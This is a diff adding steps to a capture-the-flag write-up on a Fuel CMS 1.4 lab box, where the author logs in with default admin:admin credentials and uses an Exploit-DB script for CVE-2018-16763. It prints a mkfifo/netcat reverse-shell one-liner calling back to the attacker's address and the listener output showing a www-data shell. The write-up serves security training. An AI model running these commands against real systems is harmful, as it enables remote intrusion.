@@ -98,3 +98,22 @@ Finished
 > [!note]
 > As you can see, I am in with admin:admin already but i need to get a reverse shell to be able to get user & root flag as Fuel CMS version is 1.4 and CVE-2018-16763 targets this with RCE.
 
+> [!note]
+> Went on exploit DB and got a python script to spawn a pseudo-terminal shell setup which can be upgraded via reverse shell and python cmds as follows:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ python3 fuel_exploit.py -u http://10.66.139.221/
+[+]Connecting...
+Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.144.173 4444 >/tmp/f
+```
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444                                
+listening on [any] 4444 ...
+connect to [192.168.144.173] from (UNKNOWN) [10.66.139.221] 40596
+bash: cannot set terminal process group (1041): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/html$ ls
+
+```
